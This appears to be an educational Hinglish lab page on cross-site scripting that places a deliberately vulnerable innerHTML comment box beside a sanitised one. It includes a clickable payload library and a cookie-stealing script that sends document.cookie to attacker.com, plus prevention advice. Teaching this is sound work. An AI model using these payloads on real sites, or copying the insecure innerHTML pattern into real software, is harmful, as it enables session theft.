@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Lab 03 – XSS Demo | CyberSec Lab</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet"/>
+</head>
+<body>
+  <div class="scanline"></div>
+  <div class="noise"></div>
+
+  <header class="lab-page-header">
+    <a href="../index.html" class="back-btn">← BACK</a>
+    <span class="lab-page-title">LAB 03 — XSS ATTACK DEMO</span>
+  </header>
+
+  <div class="lab-content">
+    <div class="warn-badge">⚠ SAFE SANDBOX — REAL WEBSITES PAR USE KARNA ILLEGAL HAI</div>
+
+    <div class="lab-intro">
+      <h2>💉 Cross-Site Scripting (XSS)</h2>
+      <p>XSS ek web security vulnerability hai jisme attacker malicious JavaScript code ko webpage mein inject karta hai. Yeh code doosre users ke browsers mein execute hota hai. XSS se cookies steal ho sakti hain, keyloggers plant ho sakte hain, aur fake pages dikhaye ja sakte hain. OWASP Top 10 mein XSS ek major threat hai.</p>
+    </div>
+
+    <div class="concept-box">
+      <strong>XSS Types:</strong><br/>
+      🔴 <strong>Reflected XSS:</strong> URL mein script inject hoti hai, server wapas reflect karta hai<br/>
+      🟡 <strong>Stored XSS:</strong> Script database mein save hoti hai, sab users ko affect karti hai<br/>
+      🟢 <strong>DOM-based XSS:</strong> Client-side JavaScript mein manipulation<br/>
+      <strong>Impact:</strong> Cookie theft, session hijacking, phishing, keylogging
+    </div>
+
+    <!-- VULNERABLE vs SAFE Side by Side -->
+    <div class="two-col" style="gap:1rem;margin-bottom:1.5rem;">
+      <!-- Vulnerable -->
+      <div class="panel" style="border-color:rgba(255,51,102,0.3);">
+        <h3 style="color:var(--accent3)">// ❌ VULNERABLE SITE</h3>
+        <p style="color:var(--text-dim);font-size:0.8rem;margin-bottom:0.8rem;">Yeh site user input ko sanitize nahi karta — directly innerHTML mein dalta hai!</p>
+        <div style="background:#020408;border:1px solid rgba(255,51,102,0.2);border-radius:6px;padding:1rem;margin-bottom:0.8rem;">
+          <div style="font-family:monospace;font-size:0.75rem;color:var(--text-dim);margin-bottom:0.5rem;">😊 Comment Box (Vulnerable)</div>
+          <input type="text" id="xss-input" class="lab-input" placeholder='Try: <img src=x onerror="alert(1)">' style="font-size:0.8rem;"/>
+          <button class="lab-btn danger" onclick="postVulnerable()" style="width:100%;margin-top:0.5rem;font-size:0.75rem;">POST COMMENT</button>
+        </div>
+        <div style="font-family:monospace;font-size:0.7rem;color:var(--text-dim);margin-bottom:0.3rem;">RENDERED OUTPUT (innerHTML):</div>
+        <div id="vuln-output" style="background:#0a0005;border:1px solid rgba(255,51,102,0.2);border-radius:4px;padding:0.8rem;min-height:60px;font-size:0.85rem;color:var(--text);"></div>
+        <div id="vuln-alert" style="display:none;background:rgba(255,51,102,0.15);border:1px solid var(--accent3);border-radius:6px;padding:0.8rem;margin-top:0.8rem;font-family:monospace;font-size:0.8rem;color:var(--accent3);"></div>
+      </div>
+
+      <!-- Safe -->
+      <div class="panel" style="border-color:rgba(0,255,136,0.3);">
+        <h3 style="color:var(--accent)">// ✅ SECURE SITE</h3>
+        <p style="color:var(--text-dim);font-size:0.8rem;margin-bottom:0.8rem;">Yeh site input ko sanitize karta hai — special characters escape ho jaate hain!</p>
+        <div style="background:#020408;border:1px solid rgba(0,255,136,0.2);border-radius:6px;padding:1rem;margin-bottom:0.8rem;">
+          <div style="font-family:monospace;font-size:0.75rem;color:var(--text-dim);margin-bottom:0.5rem;">😊 Comment Box (Secure)</div>
+          <input type="text" id="xss-safe-input" class="lab-input" placeholder='Same XSS payload here...' style="font-size:0.8rem;"/>
+          <button class="lab-btn" onclick="postSecure()" style="width:100%;margin-top:0.5rem;font-size:0.75rem;">POST COMMENT</button>
+        </div>
+        <div style="font-family:monospace;font-size:0.7rem;color:var(--text-dim);margin-bottom:0.3rem;">RENDERED OUTPUT (textContent - SAFE):</div>
+        <div id="safe-output" style="background:#000a05;border:1px solid rgba(0,255,136,0.2);border-radius:4px;padding:0.8rem;min-height:60px;font-size:0.85rem;color:var(--text);"></div>
+        <div style="margin-top:0.8rem;background:rgba(0,255,136,0.05);border:1px solid var(--border);border-radius:4px;padding:0.6rem;font-family:monospace;font-size:0.7rem;color:var(--accent);">✅ Script blocked — displayed as plain text</div>
+      </div>
+    </div>
+
+    <!-- Payload Library -->
+    <div class="panel">
+      <h3>// XSS PAYLOAD LIBRARY</h3>
+      <p style="color:var(--text-dim);font-size:0.85rem;margin-bottom:1rem;">Yeh common XSS payloads hain. Click karke vulnerable box mein try karo:</p>
+      <div id="payload-list" style="display:flex;flex-wrap:wrap;gap:0.5rem;"></div>
+    </div>
+
+    <!-- Cookie Stealer Demo -->
+    <div class="panel">
+      <h3>// COOKIE THEFT SIMULATION</h3>
+      <p style="color:var(--text-dim);font-size:0.85rem;margin-bottom:1rem;">XSS se attacker victim ke browser cookies steal kar sakta hai. Yeh demo dikhata hai kaise:</p>
+      <div style="background:#020408;border:1px solid var(--border);border-radius:6px;padding:1rem;margin-bottom:1rem;">
+        <div style="font-family:monospace;font-size:0.75rem;color:var(--accent3);margin-bottom:0.5rem;">// Malicious payload (real attack mein attacker ka server hota hai)</div>
+        <div style="font-family:monospace;font-size:0.8rem;color:var(--text);line-height:1.6;">
+          &lt;script&gt;<br/>
+          &nbsp;&nbsp;var stolen = document.cookie;<br/>
+          &nbsp;&nbsp;fetch('http://attacker.com/steal?c='+stolen);<br/>
+          &lt;/script&gt;
+        </div>
+      </div>
+      <button class="lab-btn danger" onclick="simulateCookieTheft()">SIMULATE COOKIE THEFT</button>
+      <div class="output-box error" id="cookie-output" style="margin-top:1rem;display:none;"></div>
+    </div>
+
+    <!-- Prevention -->
+    <div class="panel" style="border-color:rgba(0,255,136,0.3);">
+      <h3>// 🛡️ HOW TO PREVENT XSS</h3>
+      <div style="display:grid;gap:0.6rem;">
+        <div style="background:rgba(0,255,136,0.05);border:1px solid var(--border);border-radius:6px;padding:0.8rem;">
+          <div style="font-family:monospace;font-size:0.8rem;color:var(--accent);margin-bottom:0.3rem;">1. Output Encoding</div>
+          <code style="font-size:0.75rem;color:var(--text-dim);">element.textContent = userInput; // innerHTML KABHI NAI use karo!</code>
+        </div>
+        <div style="background:rgba(0,255,136,0.05);border:1px solid var(--border);border-radius:6px;padding:0.8rem;">
+          <div style="font-family:monospace;font-size:0.8rem;color:var(--accent);margin-bottom:0.3rem;">2. Content Security Policy (CSP)</div>
+          <code style="font-size:0.75rem;color:var(--text-dim);">Content-Security-Policy: default-src 'self'</code>
+        </div>
+        <div style="background:rgba(0,255,136,0.05);border:1px solid var(--border);border-radius:6px;padding:0.8rem;">
+          <div style="font-family:monospace;font-size:0.8rem;color:var(--accent);margin-bottom:0.3rem;">3. HttpOnly Cookies</div>
+          <code style="font-size:0.75rem;color:var(--text-dim);">Set-Cookie: session=abc123; HttpOnly; Secure</code>
+        </div>
+        <div style="background:rgba(0,255,136,0.05);border:1px solid var(--border);border-radius:6px;padding:0.8rem;">
+          <div style="font-family:monospace;font-size:0.8rem;color:var(--accent);margin-bottom:0.3rem;">4. Input Validation + Sanitization Libraries</div>
+          <code style="font-size:0.75rem;color:var(--text-dim);">DOMPurify.sanitize(userInput) — trusted library</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <h3>// KEY CONCEPTS LEARNED</h3>
+      <ul style="color:var(--text-dim);line-height:2;padding-left:1.2rem;font-size:0.9rem;">
+        <li>XSS kya hai aur kaise kaam karta hai</li>
+        <li>Reflected, Stored, aur DOM-based XSS ka fark</li>
+        <li>innerHTML vs textContent ka security impact</li>
+        <li>Cookie theft aur session hijacking</li>
+        <li>CSP headers aur output encoding se prevention</li>
+        <li>OWASP Top 10 mein XSS ka position</li>
+      </ul>
+    </div>
+  </div>
+
+  <script>
+    // Fake cookies for demo
+    document.cookie = "session_id=abc123xyz789; path=/";
+    document.cookie = "user_pref=darkmode; path=/";
+
+    const payloads = [
+      { label: 'Basic Alert', code: '<img src=x onerror="alert(\'XSS!\')">' },
+      { label: 'Script Tag', code: '<script>alert("XSS")<\/script>' },
+      { label: 'SVG Payload', code: '<svg onload=alert(1)>' },
+      { label: 'Cookie Steal', code: '<img src=x onerror="alert(document.cookie)">' },
+      { label: 'Bold Inject', code: '<b style="color:red">INJECTED!</b>' },
+      { label: 'Redirect', code: '<a href="javascript:alert(\'Redirecting!\')">Click me</a>' },
+    ];
+
+    const payloadDiv = document.getElementById('payload-list');
+    payloads.forEach(p => {
+      const btn = document.createElement('button');
+      btn.className = 'lab-btn danger';
+      btn.style.fontSize = '0.7rem';
+      btn.style.padding = '0.3rem 0.7rem';
+      btn.textContent = p.label;
+      btn.onclick = () => {
+        document.getElementById('xss-input').value = p.code;
+        document.getElementById('xss-safe-input').value = p.code;
+      };
+      payloadDiv.appendChild(btn);
+    });
+
+    function postVulnerable() {
+      const val = document.getElementById('xss-input').value;
+      const out = document.getElementById('vuln-output');
+      const alertBox = document.getElementById('vuln-alert');
+
+      // Check if it's a script/event handler
+      const dangerous = /<script|onerror|onload|javascript:|onclick|<svg/i.test(val);
+
+      if (dangerous) {
+        alertBox.style.display = 'block';
+        alertBox.innerHTML = `🚨 XSS ATTACK DETECTED!<br/>Browser ne execute kiya:<br/><span style="color:#ff9933">${escapeHtml(val)}</span><br/><br/>Real browser mein yeh script run ho jaati!`;
+        out.innerHTML = `<span style="color:#ff3366">[Script blocked in sandbox for safety]</span><br/>Input: ${escapeHtml(val)}`;
+      } else {
+        alertBox.style.display = 'none';
+        out.innerHTML = val; // Vulnerable — direct innerHTML
+      }
+    }
+
+    function postSecure() {
+      const val = document.getElementById('xss-safe-input').value;
+      const out = document.getElementById('safe-output');
+      out.textContent = val; // Safe — textContent escapes HTML
+    }
+
+    function escapeHtml(text) {
+      return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    }
+
+    function simulateCookieTheft() {
+      const out = document.getElementById('cookie-output');
+      out.style.display = 'block';
+      const cookies = document.cookie || 'session_id=abc123xyz789; user_pref=darkmode';
+      out.textContent = `[SIMULATION — NO ACTUAL DATA SENT]\n\n🔴 ATTACK EXECUTED!\n\nStolen cookies:\n${cookies}\n\nAttacker's server pe request:\nGET http://attacker.com/steal?c=${encodeURIComponent(cookies)}\n\nAb attacker yeh cookies use karke aapke account mein login kar sakta hai!\n(HttpOnly flag hoti toh yeh possible nahi hota)`;
+    }
+  </script>
+</body>
+</html>
